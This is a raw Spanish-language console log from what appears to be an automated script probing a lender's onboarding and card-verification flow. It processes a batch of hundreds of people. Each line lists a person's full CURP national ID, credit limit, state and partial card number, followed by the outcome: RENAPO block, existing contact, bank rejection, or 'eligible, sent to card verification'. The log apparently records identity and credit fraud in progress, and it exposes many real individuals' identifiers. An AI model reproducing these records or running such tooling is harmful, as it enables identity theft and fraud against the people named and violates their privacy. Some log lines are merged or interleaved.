[1029] ID:3335758 | GOTM691111HTSNRR03 | $191,090 | TAMAULIPAS | T:2654... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1030] ID:330905 | GORH731112HMNRSR08 | $191,000 | MICHOACAN | T:9493... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (11.0s)
[1031] ID:527368 | GOOL700917HBSMRS06 | $191,000 | BAJA CALIFOR | T:7712... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.3s)
[1032] ID:675560 | GAJU690624HASRRN09 | $191,000 | AGUASCALIENT | T:5494... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.0s)
[1033] ID:1099039 | GABM700722HMCRRR05 | $191,000 | ESTADO DE ME | T:9650... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.9s)
[1034] ID:1408035 | AUVA761228HMCGGL00 | $191,000 | ESTADO DE ME | T:0822... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (1.6s)
[1035] ID:1715397 | IIHL690623HDFBRS08 | $191,000 | CIUDAD DE ME | T:5672... [🔴 OFF] Contacto preexistente (/confirm-contact) (10.3s)
[1036] ID:1975443 | AEBE700520MCHCTS04 | $191,000 | CHIHUAHUA | T:0068... [🔴 OFF] Contacto preexistente (/confirm-contact) (10.5s)
[1037] ID:2283188 | AEGJ690508MMSCNN08 | $191,000 | MORELOS | T:5173... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (11.2s)
[1038] ID:2441773 | LURA730720HDFNBL04 | $191,000 | CIUDAD DE ME | T:1962... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (7.6s)
[1039] ID:3543736 | SAGJ701216HCGNNS01 | $191,000 | COAHUILA | T:5003... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5173 para ID:2283188 ($191,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.0s)
[1040] ID:3832873 | AERC690927MBSRNR08 | $191,000 | BAJA CALIFOR | T:2959... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.8s)
[1041] ID:3925233 | AAML741023HSOMJS02 | $191,000 | SINALOA | T:5695... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.4s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[1042] ID:4042507 | MOVJ710313HMCNLS03 | $191,000 | ESTADO DE ME | T:1056... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.1s)
[1043] ID:4727945 | CARJ690312HMCNVV08 | $191,000 | ESTADO DE ME | T:0731... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1044] ID:4842250 | PEHL700725MNLRRZ04 | $191,000 | NUEVO LEON | T:1916... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (6.8s)
[1045] ID:140603 | LUJA750406HCGCRR08 | $190,990 | COAHUILA | T:2386... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1056 para ID:4042507 ($191,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.4s)
[1046] ID:2923422 | KEVA700530MMCLGN07 | $190,990 | ESTADO DE ME | T:1800... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.0s)
[1047] ID:2757931 | RUMD700413HSPZRV00 | $190,930 | SAN LUIS POT | T:7552... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (8.3s)
[1048] ID:4455935 | GACM711002MNLRHY03 | $190,920 | NUEVO LEON | T:9590... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.1s)
[1049] ID:2257335 | ROLM740404HCSQML05 | $190,900 | CHIAPAS | T:4944... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.0s)
[1050] ID:2808801 | VARG710804MCLLDR04 | $190,850 | COAHUILA | T:3502... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7552 para ID:2757931 ($190,930)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1051] ID:1815787 | CUGE711120HQTVLR04 | $190,800 | QUERETARO | T:6440... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (1.7s)
[1052] ID:1857162 | MEME770715HCGZNN06 | $190,800 | COAHUILA | T:4784... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.9s)
[1053] ID:4780677 | VADH720420HVRRRC07 | $190,800 | VERACRUZ | T:9949... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.6s)
[1054] ID:4796111 | ROML741118HDFDRS08 | $190,800 | CIUDAD DE ME | T:0276... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.5s)
[1055] ID:218115 | CARL740526HDFMMS00 | $190,770 | CIUDAD DE ME | T:3775... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9590 para ID:4455935 ($190,920)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (10.5s)
[1056] ID:896753 | OINM710414HTSLRR04 | $190,760 | TAMAULIPAS | T:6423... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.2s)
[1057] ID:3870480 | GOMR760314HMCZMB07 | $190,680 | ESTADO DE ME | T:1021... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1058] ID:3667974 | OIVC800516HMCLLR06 | $190,600 | ESTADO DE ME | T:7126... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.3s)
[1059] ID:4787462 | VAAD720608HDFLRR09 | $190,580 | CIUDAD DE ME | T:9171... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (8.6s)
[1060] ID:201357 | MOFP880211HMCRLD07 | $190,500 | ESTADO DE ME | T:4462... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7126 para ID:3667974 ($190,600)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.1s)
[1061] ID:2613092 | VATJ690605HCSLRN07 | $190,500 | CHIAPAS | T:7481... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[1062] ID:3876130 | HULA690903HYNCPR07 | $190,500 | YUCATAN | T:3593... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.1s)
[1063] ID:3451062 | CARL740526HDFMMS00 | $190,480 | CIUDAD DE ME | T:6521... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (11.5s)
[1064] ID:3990657 | BOBM740922HCPJRR07 | $190,400 | CAMPECHE | T:0849... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.0s)
[1065] ID:4059285 | MOGA690925HMCRRL01 | $190,390 | ESTADO DE ME | T:1716... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9171 para ID:4787462 ($190,580)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.2s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (12.4s)
[1066] ID:1780311 | SARA690617HNLLYL09 | $190,380 | NUEVO LEON | T:6407... [1067] ID:2265728 | HEBJ720105HPLRDN00 | $190,380 | PUEBLA | T:2656... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.4s)
[1068] ID:1043477 | ROOA711215HMCDRN03 | $190,350 | ESTADO DE ME | T:0850... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[1069] ID:1391742 | PUVC720417HDGLLH09 | $190,350 | DURANGO | T:3294... [🔴 OFF] Contacto preexistente (/confirm-contact) (10.4s)
[1070] ID:115057 | VIFR701126MMSCGC09 | $190,330 | MORELOS | T:9082... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.0s)
[1071] ID:2469290 | OIVC800516HMCLLR06 | $190,320 | ESTADO DE ME | T:3368... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.7s)
[1072] ID:3574476 | ZACM750526MDFMRR05 | $190,320 | CIUDAD DE ME | T:1167... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9082 para ID:115057 ($190,330)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.9s)
[1073] ID:1883876 | MOCG720407HNLNVN01 | $190,300 | NUEVO LEON | T:3532... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (10.8s)
[1074] ID:2595768 | LRIG700718HTSXDG01 | $190,300 | TAMAULIPAS | T:0830... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)
[1075] ID:1650201 | OOOL010101HSORRSA9 | $190,280 | SONORA | T:2303... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3368 para ID:2469290 ($190,320)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.9s)
[1076] ID:367133 | GAGV710420HDFLRC01 | $190,260 | CIUDAD DE ME | T:4491... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (1.7s)
[1077] ID:239016 | HINL721104HSLGTN08 | $190,250 | SINALOA | T:2730... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[1078] ID:2839501 | CACG691027MMCHBL02 | $190,240 | ESTADO DE ME | T:7783... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.9s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[1079] ID:1608481 | RADJ700919HMNMLN04 | $190,200 | MICHOACAN | T:7760... [🔴 OFF] Contacto preexistente (/confirm-contact) (10.9s)
[1080] ID:133329 | CAMA701217HSOSYL00 | $190,180 | SINALOA | T:2652... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3532 para ID:1883876 ($190,300)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.1s)
[1081] ID:1155062 | MAAO700816HDFRLQ07 | $190,150 | CIUDAD DE ME | T:3261... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.3s)
[1082] ID:1465839 | RIAE730723MJCVRS09 | $190,120 | JALISCO | T:5924... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.0s)
[1083] ID:4554240 | AACM781130HMNNRR04 | $190,120 | MICHOACAN | T:4845... [🔴 OFF] Rechazo bancario (PE1002) (14.5s)
[1084] ID:4123863 | GABR690211HCSRLL03 | $190,090 | CHIAPAS | T:2954... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.3s)
[1085] ID:1194291 | SAEM720906HCSNSG04 | $190,080 | CHIAPAS | T:5162... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.7s)
[1086] ID:1649427 | NUGM711210HJCNRS03 | $190,080 | JALISCO | T:4992... [🔴 OFF] Contacto preexistente (/confirm-contact) (10.6s)
[1087] ID:1923373 | FUGS711005MSONRR04 | $190,060 | SINALOA | T:0908... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.5s)
[1088] ID:286650 | LORP690318MQTPBL01 | $190,000 | QUERETARO | T:9779... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.7s)
[1089] ID:477393 | LAHV730319HVRZDC03 | $190,000 | VERACRUZ | T:2659... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.3s)
[1090] ID:531829 | MAGL690615HHGNRR09 | $190,000 | HIDALGO | T:7328... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.8s)
[1091] ID:540741 | CATA731004MDFSRN06 | $190,000 | CIUDAD DE ME | T:0403... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.4s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (11.5s)
[1092] ID:571203 | OICS710405HJCRRL01 | $190,000 | JALISCO | T:9442... [1093] ID:577602 | LOSE691107HCGPLR02 | $190,000 | COAHUILA | T:3572... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.3s)
[1094] ID:1083629 | MAGM691106MDFRTR09 | $190,000 | CIUDAD DE ME | T:7116... [🔴 OFF] Rechazo bancario (PE1002) (8.5s)
[1095] ID:1217050 | UIRP740615MCHRZL08 | $190,000 | CHIHUAHUA | T:3559... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.6s)
[1096] ID:1408102 | DUOJ761226HTSNLS04 | $190,000 | TAMAULIPAS | T:6570... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.2s)
[1097] ID:1679057 | AEZM721018HQTRMG07 | $190,000 | QUERETARO | T:4543... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.6s)
[1098] ID:1715901 | MOME701010HNLJNL04 | $190,000 | NUEVO LEON | T:1514... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.2s)
[1099] ID:2123727 | HEHA700819MDFLRR09 | $190,000 | CIUDAD DE ME | T:2924... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.8s)
[1100] ID:2208870 | AERB721013MDFRML08 | $190,000 | CIUDAD DE ME | T:2466... [🔴 OFF] Contacto preexistente (/confirm-contact) (9.4s)
[1101] ID:2745951 | PIRA691010HBCRZL03 | $190,000 | BAJA CALIFOR | T:0439... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.6s)
[1102] ID:2853887 | AUAC710526MTCGQR03 | $190,000 | TABASCO | T:1206... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.5s)
[1103] ID:2859264 | CABL740211MDFSRR04 | $190,000 | CIUDAD DE ME | T:2255... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (2.4s)
[1104] ID:2971564 | HUBJ710616HSPRLN07 | $190,000 | SAN LUIS POT | T:8898... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (10.7s)
[1105] ID:3029511 | VELE730727MJCLPS06 | $190,000 | JALISCO | T:6924... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.2s)
[1106] ID:3047672 | MEMN740322MMCJNM03 | $190,000 | ESTADO DE ME | T:3180... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1107] ID:3363491 | ZAML700901HDFPRS03 | $190,000 | CIUDAD DE ME | T:9528... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.0s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6924 para ID:3029511 ($190,000)... [1108] ID:3503657 | MAGF700607HNLLNL03 | $190,000 | NUEVO LEON | T:6472... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.8s)
[1109] ID:3583608 | RIMF741203HGRVCR04 | $190,000 | GUERRERO | T:5079... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9528 para ID:3363491 ($190,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (21.2s)
[1110] ID:3689328 | CAFJ700322HNLSLS01 | $190,000 | NUEVO LEON | T:4584... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.2s)
[1111] ID:3887959 | BEFA690520HMSNGL02 | $190,000 | MORELOS | T:0942... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6472 para ID:3503657 ($190,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[1112] ID:3958494 | ROAG700827HNLCVS04 | $190,000 | NUEVO LEON | T:4791... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.1s)
[1113] ID:3995030 | CUBM690525HSORRN00 | $190,000 | SINALOA | T:6038... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (14.1s)
[1114] ID:4310767 | AUEG730913MJCGSD00 | $190,000 | JALISCO | T:0987... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[1115] ID:4807071 | OEAE740816HMCLLD00 | $190,000 | ESTADO DE ME | T:3857... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[1116] ID:4850938 | LOML710316MNLZCN02 | $190,000 | NUEVO LEON | T:1848... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.8s)
[1117] ID:4318939 | PEGM750517HNLRJG00 | $189,970 | NUEVO LEON | T:2933... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.0s)
[1118] ID:2766049 | MOHS730818MDGNRN06 | $189,950 | DURANGO | T:3168... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
[1119] ID:4065282 | GOGJ690407HJCNNR06 | $189,950 | JALISCO | T:8058... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1120] ID:3788857 | CIIF720824HJCVZR08 | $189,910 | JALISCO | T:1777... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.8s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[1121] ID:21632 | AUGC721229MTSGLL01 | $189,900 | TAMAULIPAS | T:3167... [1122] ID:782628 | CAAI760427MSORGR04 | $189,900 | SINALOA | T:6564... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.0s)
[1123] ID:1203708 | COAJ770705HNTNRV03 | $189,900 | NAYARIT | T:3255... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.0s)
[1124] ID:2120405 | NAAM770715HSOVRR00 | $189,900 | SONORA | T:0850... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1125] ID:2356204 | ROKC730215HMSSRR02 | $189,900 | MORELOS | T:4177... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[1126] ID:3267357 | NAGC700325HGRRLR00 | $189,900 | GUERRERO | T:6301... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[1127] ID:4214282 | MACC710401HQRRNR09 | $189,900 | QUINTANA ROO | T:1434... [🔴 OFF] Rechazo bancario (PE170) (13.7s)
[1128] ID:4670492 | SATR690209HSORNB00 | $189,900 | SONORA | T:5058... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1129] ID:4748305 | TEGS690316HDFJMR09 | $189,840 | CIUDAD DE ME | T:0943... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1130] ID:535305 | BEHR710202HVRNRY01 | $189,800 | VERACRUZ | T:2755... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[1131] ID:1242034 | MEMN740322MMCJNM03 | $189,800 | ESTADO DE ME | T:8812... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.2s)
[1132] ID:4303130 | POGV730219MNLNRR07 | $189,800 | NUEVO LEON | T:0847... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.8s)

[+] Lote de 500 candidatos precargados con límite >= $50,000 (1969+)
[1133] ID:2458712 | OOPC700119MJCRNR02 | $189,750 | JALISCO | T:5886... [1134] ID:2923022 | SAML700219HVRNRS08 | $189,750 | VERACRUZ | T:4876... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1135] ID:4444060 | BUGA700905HNLCTL01 | $189,750 | NUEVO LEON | T:8958... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1136] ID:2572431 | QUGJ720130HSONDS08 | $189,730 | SINALOA | T:0927... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1137] ID:1813986 | GUCL740718HNLJLS00 | $189,720 | NUEVO LEON | T:8479... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1138] ID:871818 | ROLB700215MSPDNL00 | $189,690 | SAN LUIS POT | T:8025... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[1139] ID:1191202 | GAGR720309HNLRZL08 | $189,630 | NUEVO LEON | T:3680... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[1140] ID:4676650 | GAOA701004HMCRLN01 | $189,600 | ESTADO DE ME | T:4031... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8025 para ID:871818 ($189,690)... [🔴 OFF] Rechazo bancario (PE1002) (12.1s)
[1141] ID:3827161 | PAGB760219MJCDNR00 | $189,550 | JALISCO | T:8042... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1142] ID:3756328 | CAMJ710127HJCHRN05 | $189,490 | JALISCO | T:6762... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1143] ID:3558232 | MOEA731123HMCNSL02 | $189,480 | ESTADO DE ME | T:7260... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (13.7s)
[1144] ID:4602950 | RIGA770801HCGVRN01 | $189,440 | COAHUILA | T:7572... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1145] ID:220076 | HUMC750413HMSCLR09 | $189,420 | MORELOS | T:1290... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.6s)
[1146] ID:4060095 | MXAR000101HBCDGLA9 | $189,420 | BAJA CALIFOR | T:2682... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[1147] ID:662244 | MAMX740921HDFRRD06 | $189,360 | CIUDAD DE ME | T:3102... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1148] ID:4597173 | TARE700121HVRMDN05 | $189,360 | VERACRUZ | T:0652... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1149] ID:4009107 | REMR721129HCSRXY03 | $189,300 | CHIAPAS | T:7365... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[1150] ID:2179850 | NIBR721219HNLNNL02 | $189,280 | NUEVO LEON | T:9787... [1151] ID:391525 | PERL700620HDFRVS05 | $189,240 | CIUDAD DE ME | T:5926... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.9s)
[1152] ID:2156148 | VIOC740708MDFLBR09 | $189,240 | CIUDAD DE ME | T:7467... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[1153] ID:4443174 | AAMR700220HMCLRC03 | $189,240 | ESTADO DE ME | T:6754... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[1154] ID:3106504 | RIBJ000101HSLNRRA3 | $189,220 | SINALOA | T:5748... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[1155] ID:1089561 | LOSJ700515HGRPTM08 | $189,210 | GUERRERO | T:9612... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[1156] ID:2228543 | PAPD700221MDFLRL05 | $189,210 | CIUDAD DE ME | T:5015... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.9s)
[1157] ID:4488577 | SAVA771011HJCNGL03 | $189,210 | JALISCO | T:6267... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.8s)
[1158] ID:2294567 | MOHC710213MGTRRR03 | $189,140 | GUANAJUATO | T:0326... [🔴 OFF] Rechazo bancario (PE110) (18.5s)
[1159] ID:635635 | GAAF721118MDFLVR04 | $189,090 | CIUDAD DE ME | T:7978... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.4s)
[1160] ID:1498259 | SALS720803MSONNS05 | $189,090 | SONORA | T:8916... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0326 para ID:2294567 ($189,140)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1161] ID:3132898 | NIBR721219HNLNNL02 | $189,090 | NUEVO LEON | T:4153... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[1162] ID:4417043 | MARB750515MBSDML05 | $189,080 | BAJA CALIFOR | T:6760... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
[1163] ID:1081164 | MOVJ711001HGTRLN09 | $189,060 | GUANAJUATO | T:3930... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1164] ID:3392011 | OIUF750528HJCRNR06 | $189,060 | JALISCO | T:0403... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[1165] ID:809289 | MAPR710724HDFVRD06 | $189,030 | CIUDAD DE ME | T:5643... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.9s)
[1166] ID:4779549 | NASM710814MMCVNY08 | $189,030 | ESTADO DE ME | T:8931... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[1167] ID:23295 | MESE750726HVRNMF02 | $189,000 | VERACRUZ | T:7181... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3930 para ID:1081164 ($189,060)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1168] ID:25321 | GOCR810403HSPNLF00 | $189,000 | SAN LUIS POT | T:1644... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[1169] ID:358466 | MAEE760308MCHRSL08 | $189,000 | CHIHUAHUA | T:3715... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (12.8s)
[1170] ID:618091 | VAVM710917HDFCLG00 | $189,000 | CIUDAD DE ME | T:3211... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.1s)
[1171] ID:669894 | RARC760821HDFMDS09 | $189,000 | CIUDAD DE ME | T:3450... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.0s)
[1172] ID:679336 | VALE700914HDFLVD06 | $189,000 | CIUDAD DE ME | T:1489... [🔴 OFF] Rechazo bancario (PE170) (18.3s)
[1173] ID:730132 | ZATE730221HDFMQN00 | $189,000 | CIUDAD DE ME | T:7616... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1174] ID:845132 | ZALC781127HMNMPR02 | $189,000 | MICHOACAN | T:7529... [🔴 OFF] Rechazo bancario (PE040) (13.7s)
[1175] ID:944672 | CAAO710929HJCHNC04 | $189,000 | JALISCO | T:7435... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.1s)
[1176] ID:950707 | SAOM741012HMCWRR05 | $189,000 | ESTADO DE ME | T:3251... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7529 para ID:845132 ($189,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.1s)
[1177] ID:1143876 | OOHG690407MMNCRB02 | $189,000 | MICHOACAN | T:5438... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[1178] ID:1299688 | SAGE700129MSONML07 | $189,000 | SONORA | T:5999... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.0s)
[1179] ID:1368615 | LOMF710608HQTPRR00 | $189,000 | QUERETARO | T:2050... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[1180] ID:1403665 | CESJ730107HCHLRN08 | $189,000 | CHIHUAHUA | T:6431... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1181] ID:1412555 | MOMA720527MDFLLN00 | $189,000 | CIUDAD DE ME | T:8714... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7435 para ID:944672 ($189,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1182] ID:1520999 | SIHJ701023HJCPDR01 | $189,000 | JALISCO | T:7522... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.5s)
